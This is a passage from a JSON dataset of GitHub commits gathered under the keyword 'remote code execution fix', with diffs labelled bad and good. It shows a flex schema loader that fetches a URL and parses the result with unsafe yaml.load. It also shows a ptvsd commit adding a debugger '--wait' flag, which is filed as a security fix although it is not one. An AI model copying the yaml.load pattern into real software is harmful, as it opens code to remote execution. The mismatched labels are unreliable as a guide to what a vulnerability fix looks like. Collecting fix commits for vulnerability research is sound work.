parts.scheme and parts.netloc:\n            response = requests.get(source)\n            if isinstance(response.content, six.binary_type):\n                raw_source = six.text_type(response.content, encoding='utf-8')\n            else:\n                raw_source = response.content\n        else:\n            raw_source = source\n\n    try:\n        try:\n            return json.loads(raw_source)\n        except ValueError:\n            pass\n\n        try:\n            return yaml.load(raw_source)\n        except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n            pass\n    except NameError:\n        pass\n\n    raise ValueError(\n        \"Unable to parse `{0}`.  Tried yaml and json.\".format(source),\n    )\n\n\ndef parse(raw_schema):\n    context = {\n        'deferred_references': set(),\n    }\n    swagger_definitions = definitions_validator(raw_schema, context=context)\n\n    swagger_schema = swagger_schema_validator(\n        raw_schema,\n        context=swagger_definitions,\n    )\n    return swagger_schema\n\n\ndef load(target):\n    \"\"\"\n    Given one of the supported target formats, load a swagger schema into it's\n    python representation.\n    \"\"\"\n    raw_schema = load_source(target)\n    return parse(raw_schema)\n\n\ndef validate(raw_schema, target=None, **kwargs):\n    \"\"\"\n    Given the python representation of a JSONschema as defined in the swagger\n    spec, validate that the schema complies to spec.  If `target` is provided,\n    that target will be validated against the provided schema.\n    \"\"\"\n    schema = schema_validator(raw_schema, **kwargs)\n    if target is not None:\n        validate_object(target, schema=schema, **kwargs)\n\n\ndef validate_api_request(schema, raw_request):\n    request = normalize_request(raw_request)\n\n    with ErrorDict():\n        validate_request(request=request, schema=schema)\n\n\ndef validate_api_response(schema, raw_response, request_method='get', raw_request=None):\n    \"\"\"\n    Validate the response of an api call against a swagger schema.\n    \"\"\"\n    request = None\n    if raw_request is not None:\n        request = normalize_request(raw_request)\n\n    response = None\n    if raw_response is not None:\n        response = normalize_response(raw_response, request=request)\n\n    if response is not None:\n        validate_response(\n            response=response,\n            request_method=request_method,\n            schema=schema\n        )\n\n\ndef validate_api_call(schema, raw_request, raw_response):\n    \"\"\"\n    Validate the request/response cycle of an api call against a swagger\n    schema.  Request/Response objects from the `requests` and `urllib` library\n    are supported.\n    \"\"\"\n    request = normalize_request(raw_request)\n\n    with ErrorDict() as errors:\n        try:\n            validate_request(\n                request=request,\n                schema=schema,\n            )\n        except ValidationError as err:\n            errors['request'].add_error(err.messages or getattr(err, 'detail'))\n            return\n\n        response = normalize_response(raw_response, raw_request)\n\n        try:\n            validate_response(\n                response=response,\n                request_method=request.method,\n                schema=schema\n            )\n        except ValidationError as err:\n            errors['response'].add_error(err.messages or getattr(err, 'detail'))\n"}, "/tests/core/test_load_source.py": {"changes": [{"diff": "\n \n \n def test_yaml_string():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n     result = load_source(source)\n \n", "add": 1, "remove": 1, "filename": "/tests/core/test_load_source.py", "badparts": ["    native = {'foo': 'bar'}"], "goodparts": ["    native = {b'foo': b'bar'}"]}, {"diff": "\n \n \n def test_yaml_file_object():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w')\n", "add": 1, "remove": 1, "filename": "/tests/core/test_load_source.py", "badparts": ["    native = {'foo': 'bar'}"], "goodparts": ["    native = {b'foo': b'bar'}"]}, {"diff": "\n \n \n def test_yaml_file_path():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n", "add": 1, "remove": 1, "filename": "/tests/core/test_load_source.py", "badparts": ["    native = {'foo': 'bar'}"], "goodparts": ["    native = {b'foo': b'bar'}"]}], "source": "\nfrom __future__ import unicode_literals import tempfile import collections import six import json import yaml from flex.core import load_source def test_native_mapping_is_passthrough(): source={'foo': 'bar'} result=load_source(source) assert result==source def test_json_string(): native={'foo': 'bar'} source=json.dumps(native) result=load_source(source) assert result==native def test_yaml_string(): native={'foo': 'bar'} source=yaml.dump(native) result=load_source(source) assert result==native def test_json_file_object(): native={'foo': 'bar'} source=json.dumps(native) tmp_file=tempfile.NamedTemporaryFile(mode='w') tmp_file.write(source) tmp_file.file.seek(0) with open(tmp_file.name) as json_file: result=load_source(json_file) assert result==native def test_json_file_path(): native={'foo': 'bar'} source=json.dumps(native) tmp_file=tempfile.NamedTemporaryFile(mode='w', suffix='.json') tmp_file.write(source) tmp_file.flush() result=load_source(tmp_file.name) assert result==native def test_yaml_file_object(): native={'foo': 'bar'} source=yaml.dump(native) tmp_file=tempfile.NamedTemporaryFile(mode='w') tmp_file.write(source) tmp_file.flush() with open(tmp_file.name) as yaml_file: result=load_source(yaml_file) assert result==native def test_yaml_file_path(): native={'foo': 'bar'} source=yaml.dump(native) tmp_file=tempfile.NamedTemporaryFile(mode='w', suffix='.yaml') tmp_file.write(source) tmp_file.flush() result=load_source(tmp_file.name) assert result==native def test_url(httpbin): native={ 'origin': '127.0.0.1', 'args':{}, } source=httpbin.url +'/get' result=load_source(source) assert isinstance(result, collections.Mapping) result.pop('headers') result.pop('url') assert result==native ", "sourceWithComments": "from __future__ import unicode_literals\n\nimport tempfile\nimport collections\n\nimport six\n\nimport json\nimport yaml\n\nfrom flex.core import load_source\n\n\ndef test_native_mapping_is_passthrough():\n    source = {'foo': 'bar'}\n    result = load_source(source)\n\n    assert result == source\n\n\ndef test_json_string():\n    native = {'foo': 'bar'}\n    source = json.dumps(native)\n    result = load_source(source)\n\n    assert result == native\n\n\ndef test_yaml_string():\n    native = {'foo': 'bar'}\n    source = yaml.dump(native)\n    result = load_source(source)\n\n    assert result == native\n\n\ndef test_json_file_object():\n    native = {'foo': 'bar'}\n    source = json.dumps(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w')\n    tmp_file.write(source)\n    tmp_file.file.seek(0)\n\n    with open(tmp_file.name) as json_file:\n        result = load_source(json_file)\n\n    assert result == native\n\n\ndef test_json_file_path():\n    native = {'foo': 'bar'}\n    source = json.dumps(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json')\n    tmp_file.write(source)\n    tmp_file.flush()\n\n    result = load_source(tmp_file.name)\n\n    assert result == native\n\n\ndef test_yaml_file_object():\n    native = {'foo': 'bar'}\n    source = yaml.dump(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w')\n    tmp_file.write(source)\n    tmp_file.flush()\n\n    with open(tmp_file.name) as yaml_file:\n        result = load_source(yaml_file)\n\n    assert result == native\n\n\ndef test_yaml_file_path():\n    native = {'foo': 'bar'}\n    source = yaml.dump(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n    tmp_file.write(source)\n    tmp_file.flush()\n\n    result = load_source(tmp_file.name)\n\n    assert result == native\n\n\ndef test_url(httpbin):\n    native = {\n        'origin': '127.0.0.1',\n        #'headers': {\n        #    'Content-Length': '',\n        #    'Accept-Encoding': 'gzip, deflate',\n        #    'Host': '127.0.0.1:54634',\n        #    'Accept': '*/*',\n        #    'User-Agent': 'python-requests/2.4.3 CPython/2.7.8 Darwin/14.0.0',\n        #    'Connection': 'keep-alive',\n        #},\n        'args': {},\n        #'url': 'http://127.0.0.1:54634/get',\n    }\n    source = httpbin.url + '/get'\n    result = load_source(source)\n    assert isinstance(result, collections.Mapping)\n    result.pop('headers')\n    result.pop('url')\n    assert result == native\n"}}, "msg": "Fix remote code execution issue with yaml.load"}}, "https://github.com/microsoft/ptvsd": {"f453ed1c417993eab4fc7b3c5288208d97270d13": {"url": "https://api.github.com/repos/microsoft/ptvsd/commits/f453ed1c417993eab4fc7b3c5288208d97270d13", "html_url": "https://github.com/microsoft/ptvsd/commit/f453ed1c417993eab4fc7b3c5288208d97270d13", "message": "Fix #355: Add 'remote launch' - launch a program for remote debugging but continue running the user code (#769)\n\n* Fix #355: Add 'remote launch' - launch a program for remote debugging but continue running the user code\r\n\r\nAdd --wait command line argument, and don't block code execution if it is not specified.\r\n\r\n* Add copyright headers.", "sha": "f453ed1c417993eab4fc7b3c5288208d97270d13", "keyword": "remote code execution fix", "diff": "diff --git a/ptvsd/__main__.py b/ptvsd/__main__.py\nindex 5634806c..8d29bee6 100644\n--- a/ptvsd/__main__.py\n+++ b/ptvsd/__main__.py\n@@ -136,7 +136,7 @@ def _group_args(argv):\n             if nextarg is not None:\n                 supported.append(nextarg)\n             skip += 1\n-        elif arg in ('--single-session',):\n+        elif arg in ('--single-session', '--wait'):\n             supported.append(arg)\n         elif not arg.startswith('-'):\n             supported.append(arg)\n@@ -166,6 +166,8 @@ def _parse_args(prog, argv):\n     target.add_argument('filename', nargs='?')\n \n     parser.add_argument('--single-session', action='store_true')\n+    parser.add_argument('--wait', action='store_true')\n+\n     parser.add_argument('-V', '--version', action='version')\n     parser.version = __version__\n \n@@ -208,4 +210,4 @@ def main(addr, name, kind, extra=(), nodebug=False, **kwargs):\n if __name__ == '__main__':\n     args, extra = parse_args()\n     main(args.address, args.name, args.kind, extra, nodebug=args.nodebug,\n-         singlesession=args.single_session)\n+         singlesession=args.single_session, wait=args.wait)\ndiff --git a/ptvsd/_local.py b/ptvsd/_local.py\nindex d8610ec6..7872cb1c 100644\n--- a/ptvsd/_local.py\n+++ b/ptvsd/_local.py\n@@ -1,10 +1,17 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n import sys\n+import time\n \n import pydevd\n+from _pydevd_bundle.pydevd_comm import get_global_debugger\n \n from ptvsd.pydevd_hooks import install\n from ptvsd.runner import run as no_debug_runner\n from ptvsd.socket import Address\n+from ptvsd._util import new_hidden_thread\n \n \n PYDEVD_DEFAULTS = {\n@@ -24,6 +31,14 @@ def _set_pydevd_defaults(pydevd_args):\n # high-level functions\n \n def debug_main(address, name, kind, *extra, **kwargs):\n+    if not kwargs.pop('wait', False) and address.isserver:\n+        def unblock_debugger():\n+            debugger = get_global_debugger()\n+            while debugger is None:\n+                time.sleep(0.1)\n+                debugger = get_global_debugger()\n+            debugger.ready_to_run = True\n+        new_hidden_thread('ptvsd.unblock_debugger', unblock_debugger).start()\n     if kind == 'module':\n         run_module(address, name, *extra, **kwargs)\n     else:\ndiff --git a/ptvsd/_remote.py b/ptvsd/_remote.py\nindex 1c156fb2..eb8179d1 100644\n--- a/ptvsd/_remote.py\n+++ b/ptvsd/_remote.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n import pydevd\n import time\n \ndiff --git a/ptvsd/_util.py b/ptvsd/_util.py\nindex d44af8dd..d18d9d21 100644\n--- a/ptvsd/_util.py\n+++ b/ptvsd/_util.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n from __future__ import print_function\n \n import contextlib\ndiff --git a/ptvsd/daemon.py b/ptvsd/daemon.py\nindex 71fcc40c..ce02e040 100644\n--- a/ptvsd/daemon.py\n+++ b/ptvsd/daemon.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n import contextlib\n import sys\n import threading\ndiff --git a/ptvsd/exit_handlers.py b/ptvsd/exit_handlers.py\nindex 8a7e33a0..95a49c62 100644\n--- a/ptvsd/exit_handlers.py\n+++ b/ptvsd/exit_handlers.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n import atexit\n import os\n import platform\ndiff --git a/ptvsd/pydevd_hooks.py b/ptvsd/pydevd_hooks.py\nindex 52a59127..9a0b480c 100644\n--- a/ptvsd/pydevd_hooks.py\n+++ b/ptvsd/pydevd_hooks.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n import sys\n \n from _pydevd_bundle import pydevd_comm\ndiff --git a/ptvsd/session.py b/ptvsd/session.py\nindex 217490bc..eeaa940c 100644\n--- a/ptvsd/session.py\n+++ b/ptvsd/session.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n from .socket import is_socket, close_socket\n from .wrapper import VSCodeMessageProcessor\n from ._util import TimeoutError, ClosedError, Closeable, Startable, debug\ndiff --git a/ptvsd/socket.py b/ptvsd/socket.py\nindex 9b5a0f3c..49739b29 100644\n--- a/ptvsd/socket.py\n+++ b/ptvsd/socket.py\n@@ -1,3 +1,7 @@\n+# Copyright (c) Microsoft Corporation. All rights reserved.\n+# Licensed under the MIT License. See LICENSE in the project root\n+# for license information.\n+\n from __future__ import absolute_import\n \n from collections import namedtuple\ndiff --git a/tests/helpers/debugadapter.py b/tests/helpers/debugadapter.py\nindex a3c82629..bb69efe8 100644\n--- a/tests/helpers/debugadapter.py\n+++ b/tests/helpers/debugadapter.py\n@@ -198,6 +198,8 @@ def _start_as(cls,\n         argv = []\n         if server:\n             argv += ['--server']\n+            if kwargs.pop('wait', True):\n+                argv += ['--wait']\n         if kind == 'script':\n             argv += [name]\n         elif kind == 'module':\ndiff --git a/tests/helpers/debugclient.py b/tests/helpers/debugclient.py\nindex 9b837624..ec4d098a 100644\n--- a/tests/helpers/debugclient.py\n+++ b/tests/helpers/debugclient.py\n@@ -139,7 +139,12 @@ def start(*args, **kwargs):\n         if wait_for_connect:\n             wait_for_connect()\n         else:\n-            wait_for_socket_server(addr)\n+            try:\n+                wait_for_socket_server(addr)\n+            except Exception:\n+                # If we fail to connect, print out the adapter output.\n+                self._adapter.VERBOSE = True\n+                raise\n             self._attach(addr, **kwargs)\n \n     def _attach(self, addr, **kwargs):\n@@ -243,6 +248,8 @@ def launch_script(self, filename, *argv, **kwargs):\n         ] + list(argv)\n         if kwargs.pop('nodebug', False):\n             argv.insert(0, '--nodebug')\n+        if kwargs.pop('wait', True):\n+            argv.insert(0, '--wait')\n         self._launch(argv, **kwargs)\n         return self._adapter, self._session\n \ndiff --git a/tests/helpers/debugsession.py b/tests/helpers/debugsession.py\nindex 17f1451e..51dc37e4 100644\n--- a/tests/helpers/debugsession.py\n+++ b/tests/helpers/debugsession.py\n@@ -279,12 +279,19 @@ def _close(self):\n         self._check_handlers()\n \n     def _listen(self):\n+        eof = None\n         try:\n             for msg in self._conn.iter_messages():\n                 if self.VERBOSE:\n                     print(' ->', msg)\n                 self._receive_message(msg)\n-        except EOFError:\n+        except EOFError as ex:\n+            # Handle EOF outside of except to avoid unnecessary chaining.\n+            eof = ex\n+        if eof:\n+            remainder = getattr(eof, 'remainder', b'')\n+            if remainder:\n+                self._receive_message(remainder)\n             try:\n                 self.close()\n             except ClosedError:\ndiff --git a/tests/ptvsd/test___main__.py b/tests/ptvsd/test___main__.py\nindex 91f1348b..f921d8f6 100644\n--- a/tests/ptvsd/test___main__.py\n+++ b/tests/ptvsd/test___main__.py\n@@ -22,6 +22,7 @@ def test_module(self):\n             'address': Address.as_server(None, 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -39,6 +40,7 @@ def test_module_server(self):\n             'address': Address.as_server('10.0.1.1', 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -56,6 +58,7 @@ def test_module_nodebug(self):\n             'address': Address.as_client(None, 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -72,6 +75,7 @@ def test_script(self):\n             'address': Address.as_server(None, 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -89,6 +93,7 @@ def test_script_server(self):\n             'address': Address.as_server('10.0.1.1', 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -106,6 +111,7 @@ def test_script_nodebug(self):\n             'address': Address.as_client(None, 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -123,6 +129,7 @@ def test_remote(self):\n             'address': Address.as_client('1.2.3.4', 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -140,6 +147,7 @@ def test_remote_localhost(self):\n             'address': Address.as_client('localhost', 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -158,6 +166,7 @@ def test_remote_nodebug(self):\n             'address': Address.as_client('1.2.3.4', 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -175,6 +184,7 @@ def test_remote_single_session(self):\n             'address': Address.as_server('localhost', 8888),\n             'nodebug': False,\n             'single_session': True,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -193,6 +203,26 @@ def test_local_single_session(self):\n             'address': Address.as_server('1.2.3.4', 8888),\n             'nodebug': False,\n             'single_session': True,\n+            'wait': False,\n+        })\n+        self.assertEqual(extra, self.EXPECTED_EXTRA)\n+\n+    def test_remote_wait(self):\n+        args, extra = parse_args([\n+            'eggs',\n+            '--host', '1.2.3.4',\n+            '--port', '8888',\n+            '--wait',\n+            'spam.py',\n+        ])\n+\n+        self.assertEqual(vars(args), {\n+            'kind': 'script',\n+            'name': 'spam.py',\n+            'address': Address.as_client('1.2.3.4', 8888),\n+            'nodebug': False,\n+            'single_session': False,\n+            'wait': True,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -218,6 +248,7 @@ def test_extra(self):\n             'address': Address.as_server(None, 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, [\n             '--DEBUG',\n@@ -254,6 +285,7 @@ def test_extra_nodebug(self):\n             'address': Address.as_client(None, 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, [\n             '--DEBUG',\n@@ -281,6 +313,7 @@ def test_empty_host(self):\n             'address': Address.as_server('', 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -308,6 +341,7 @@ def test_backward_compatibility_host(self):\n             'address': Address.as_client('1.2.3.4', 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -326,6 +360,7 @@ def test_backward_compatibility_host_nodebug(self):\n             'address': Address.as_client('1.2.3.4', 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -343,6 +378,7 @@ def test_backward_compatibility_module(self):\n             'address': Address.as_server(None, 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -361,6 +397,7 @@ def test_backward_compatibility_module_nodebug(self):\n             'address': Address.as_client(None, 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -377,6 +414,7 @@ def test_backward_compatibility_script(self):\n             'address': Address.as_server(None, 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -394,6 +432,7 @@ def test_backward_compatibility_script_nodebug(self):\n             'address': Address.as_client(None, 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, self.EXPECTED_EXTRA)\n \n@@ -411,6 +450,7 @@ def test_pseudo_backward_compatibility(self):\n             'address': Address.as_server(None, 8888),\n             'nodebug': False,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, ['--module'] + self.EXPECTED_EXTRA)\n \n@@ -429,5 +469,6 @@ def test_pseudo_backward_compatibility_nodebug(self):\n             'address': Address.as_client(None, 8888),\n             'nodebug': True,\n             'single_session': False,\n+            'wait': False,\n         })\n         self.assertEqual(extra, ['--module'] + self.EXPECTED_EXTRA)\ndiff --git a/tests/system_tests/test_connection.py b/tests/system_tests/test_connection.py\nindex 3a672fe2..73096494 100644\n--- a/tests/system_tests/test_connection.py\n+++ b/tests/system_tests/test_connection.py\n@@ -114,6 +114,7 @@ def connect(addr, wait=None, closeonly=False):\n         self.addCleanup(lambda: os.close(wpipe))\n         proc = Proc.start_python_module('ptvsd', [\n             '--server',\n+            '--wait',\n             '--port', '5678',\n             '--file', filename,\n         ], env={\n", "files": {"/ptvsd/__main__.py": {"changes": [{"diff": "\n             if nextarg is not None:\n                 supported.append(nextarg)\n             skip += 1\n-        elif arg in ('--single-session',):\n+        elif arg in ('--single-session', '--wait'):\n             supported.append(arg)\n         elif not arg.startswith('-'):\n             supported.append(arg)\n", "add": 1, "remove": 1, "filename": "/ptvsd/__main__.py", "badparts": ["        elif arg in ('--single-session',):"], "goodparts": ["        elif arg in ('--single-session', '--wait'):"]}, {"diff": "\n if __name__ == '__main__':\n     args, extra = parse_args()\n     main(args.address, args.name, args.kind, extra, nodebug=args.nodebug,\n-         singlesession=args.single_session)\n+         singlesession=args.single_session, wait=args.wait)", "add": 1, "remove": 1, "filename": "/ptvsd/__main__.py", "badparts": ["         singlesession=args.single_session)"], "goodparts": ["         singlesession=args.single_session, wait=args.wait)"]}], "source": "\n import argparse import os.path import sys from ptvsd._local import debug_main, run_main from ptvsd.socket import Address from ptvsd.version import __version__, __author__ \"\"\" For the PyDevd CLI handling see: https://github.com/fabioz/PyDev.Debugger/blob/master/_pydevd_bundle/pydevd_command_line_handling.py https://github.com/fabioz/PyDev.Debugger/blob/master/pydevd.py \"\"\" PYDEVD_OPTS={ '--file', '--client', '--vm_type', } PYDEVD_FLAGS={ '--DEBUG', '--DEBUG_RECORD_SOCKET_READS', '--cmd-line', '--module', '--multiproc', '--multiprocess', '--print-in-debugger-startup', '--save-signatures', '--save-threading', '--save-asyncio', '--server', '--qt-support=auto', } USAGE=\"\"\" {0}[-h][-V][--nodebug][--host HOST | --server-host HOST] --port PORT -m MODULE[arg...] {0}[-h][-V][--nodebug][--host HOST | --server-host HOST] --port PORT FILENAME[arg...] \"\"\" def parse_args(argv=None): \"\"\"Return the parsed args to use in main().\"\"\" if argv is None: argv=sys.argv prog=argv[0] if prog==__file__: prog='{} -m ptvsd'.format(os.path.basename(sys.executable)) else: prog=argv[0] argv=argv[1:] supported, pydevd, script=_group_args(argv) args=_parse_args(prog, supported) extra=pydevd +['--'] if script: extra +=script return args, extra def _group_args(argv): supported=[] pydevd=[] script=[] try: pos=argv.index('--') except ValueError: script=[] else: script=argv[pos +1:] argv=argv[:pos] for arg in argv: if arg=='-h' or arg=='--help': return argv,[], script gottarget=False skip=0 for i in range(len(argv)): if skip: skip -=1 continue arg=argv[i] try: nextarg=argv[i +1] except IndexError: nextarg=None if gottarget: script=argv[i:] +script break if arg=='--client': arg='--host' elif arg=='--file': if nextarg is None: pydevd.append(arg) continue if nextarg.endswith(':') and '--module' in pydevd: pydevd.remove('--module') arg='-m' argv[i +1]=nextarg=nextarg[:-1] else: arg=nextarg skip +=1 if arg in PYDEVD_OPTS: pydevd.append(arg) if nextarg is not None: pydevd.append(nextarg) skip +=1 elif arg in PYDEVD_FLAGS: pydevd.append(arg) elif arg=='--nodebug': supported.append(arg) elif arg in('--host', '--server-host', '--port', '-m'): if arg=='-m': gottarget=True supported.append(arg) if nextarg is not None: supported.append(nextarg) skip +=1 elif arg in('--single-session',): supported.append(arg) elif not arg.startswith('-'): supported.append(arg) gottarget=True else: supported.append(arg) break return supported, pydevd, script def _parse_args(prog, argv): parser=argparse.ArgumentParser( prog=prog, usage=USAGE.format(prog), ) parser.add_argument('--nodebug', action='store_true') host=parser.add_mutually_exclusive_group() host.add_argument('--host') host.add_argument('--server-host') parser.add_argument('--port', type=int, required=True) target=parser.add_mutually_exclusive_group(required=True) target.add_argument('-m', dest='module') target.add_argument('filename', nargs='?') parser.add_argument('--single-session', action='store_true') parser.add_argument('-V', '--version', action='version') parser.version=__version__ args=parser.parse_args(argv) ns=vars(args) serverhost=ns.pop('server_host', None) clienthost=ns.pop('host', None) if serverhost: args.address=Address.as_server(serverhost, ns.pop('port')) elif not clienthost: if args.nodebug: args.address=Address.as_client(clienthost, ns.pop('port')) else: args.address=Address.as_server(clienthost, ns.pop('port')) else: args.address=Address.as_client(clienthost, ns.pop('port')) module=ns.pop('module') filename=ns.pop('filename') if module is None: args.name=filename args.kind='script' else: args.name=module args.kind='module' return args def main(addr, name, kind, extra=(), nodebug=False, **kwargs): if nodebug: run_main(addr, name, kind, *extra, **kwargs) else: debug_main(addr, name, kind, *extra, **kwargs) if __name__=='__main__': args, extra=parse_args() main(args.address, args.name, args.kind, extra, nodebug=args.nodebug, singlesession=args.single_session) ", "sourceWithComments": "# Copyright (c) Microsoft Corporation. All rights reserved.\n# Licensed under the MIT License. See LICENSE in the project root\n# for license information.\n\nimport argparse\nimport os.path\nimport sys\n\nfrom ptvsd._local import debug_main, run_main\nfrom ptvsd.socket import Address\nfrom ptvsd.version import __version__, __author__  # noqa\n\n\n##################################\n# the script\n\n\"\"\"\nFor the PyDevd CLI handling see:\n\n  https://github.com/fabioz/PyDev.Debugger/blob/master/_pydevd_bundle/pydevd_command_line_handling.py\n  https://github.com/fabioz/PyDev.Debugger/blob/master/pydevd.py#L1450  (main func)\n\"\"\"  # noqa\n\nPYDEVD_OPTS = {\n    '--file',\n    '--client',\n    #'--port',\n    '--vm_type',\n}\n\nPYDEVD_FLAGS = {\n    '--DEBUG',\n    '--DEBUG_RECORD_SOCKET_READS',\n    '--cmd-line',\n    '--module',\n    '--multiproc',\n    '--multiprocess',\n    '--print-in-debugger-startup',\n    '--save-signatures',\n    '--save-threading',\n    '--save-asyncio',\n    '--server',\n    '--qt-support=auto',\n}\n\nUSAGE = \"\"\"\n  {0} [-h] [-V] [--nodebug] [--host HOST | --server-host HOST] --port PORT -m MODULE [arg ...]\n  {0} [-h] [-V] [--nodebug] [--host HOST | --server-host HOST] --port PORT FILENAME [arg ...]\n\"\"\"  # noqa\n\n\ndef parse_args(argv=None):\n    \"\"\"Return the parsed args to use in main().\"\"\"\n    if argv is None:\n        argv = sys.argv\n        prog = argv[0]\n        if prog == __file__:\n            prog = '{} -m ptvsd'.format(os.path.basename(sys.executable))\n    else:\n        prog = argv[0]\n    argv = argv[1:]\n\n    supported, pydevd, script = _group_args(argv)\n    args = _parse_args(prog, supported)\n    # '--' is used in _run_args to extract pydevd specific args\n    extra = pydevd + ['--']\n    if script:\n        extra += script\n    return args, extra\n\n\ndef _group_args(argv):\n    supported = []\n    pydevd = []\n    script = []\n\n    try:\n        pos = argv.index('--')\n    except ValueError:\n        script = []\n    else:\n        script = argv[pos + 1:]\n        argv = argv[:pos]\n\n    for arg in argv:\n        if arg == '-h' or arg == '--help':\n            return argv, [], script\n\n    gottarget = False\n    skip = 0\n    for i in range(len(argv)):\n        if skip:\n            skip -= 1\n            continue\n\n        arg = argv[i]\n        try:\n            nextarg = argv[i + 1]\n        except IndexError:\n            nextarg = None\n\n        # TODO: Deprecate the PyDevd arg support.\n        # PyDevd support\n        if gottarget:\n            script = argv[i:] + script\n            break\n        if arg == '--client':\n            arg = '--host'\n        elif arg == '--file':\n            if nextarg is None:  # The filename is missing...\n                pydevd.append(arg)\n                continue  # This will get handled later.\n            if nextarg.endswith(':') and '--module' in pydevd:\n                pydevd.remove('--module')\n                arg = '-m'\n                argv[i + 1] = nextarg = nextarg[:-1]\n            else:\n                arg = nextarg\n                skip += 1\n\n        if arg in PYDEVD_OPTS:\n            pydevd.append(arg)\n            if nextarg is not None:\n                pydevd.append(nextarg)\n            skip += 1\n        elif arg in PYDEVD_FLAGS:\n            pydevd.append(arg)\n        elif arg == '--nodebug':\n            supported.append(arg)\n\n        # ptvsd support\n        elif arg in ('--host', '--server-host', '--port', '-m'):\n            if arg == '-m':\n                gottarget = True\n            supported.append(arg)\n            if nextarg is not None:\n                supported.append(nextarg)\n            skip += 1\n        elif arg in ('--single-session',):\n            supported.append(arg)\n        elif not arg.startswith('-'):\n            supported.append(arg)\n            gottarget = True\n\n        # unsupported arg\n        else:\n            supported.append(arg)\n            break\n\n    return supported, pydevd, script\n\n\ndef _parse_args(prog, argv):\n    parser = argparse.ArgumentParser(\n        prog=prog,\n        usage=USAGE.format(prog),\n    )\n    parser.add_argument('--nodebug', action='store_true')\n    host = parser.add_mutually_exclusive_group()\n    host.add_argument('--host')\n    host.add_argument('--server-host')\n    parser.add_argument('--port', type=int, required=True)\n\n    target = parser.add_mutually_exclusive_group(required=True)\n    target.add_argument('-m', dest='module')\n    target.add_argument('filename', nargs='?')\n\n    parser.add_argument('--single-session', action='store_true')\n    parser.add_argument('-V', '--version', action='version')\n    parser.version = __version__\n\n    args = parser.parse_args(argv)\n    ns = vars(args)\n\n    serverhost = ns.pop('server_host', None)\n    clienthost = ns.pop('host', None)\n    if serverhost:\n        args.address = Address.as_server(serverhost, ns.pop('port'))\n    elif not clienthost:\n        if 